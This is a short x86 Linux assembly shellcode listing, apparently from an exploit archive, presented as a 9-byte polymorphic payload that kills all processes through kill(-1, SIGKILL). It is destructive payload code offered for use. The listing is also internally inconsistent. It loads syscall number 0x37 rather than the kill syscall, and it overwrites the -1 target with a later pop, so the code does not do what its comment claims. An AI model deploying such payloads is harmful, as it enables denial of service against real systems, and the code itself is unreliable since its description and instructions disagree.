; linux/x86 kill all processes 9 bytes
; root@thegibson
; polymorphism by d3c3pt10n (Kevin Kirsche)
; 2010-01-14
 
global _start
section .text

_start:
        ; kill(-1, SIGKILL);
        push 0x9
        push 0x37
        pop eax
        xor ebx, ebx
        dec ebx
        pop ebx
        pop ecx
        int 0x80
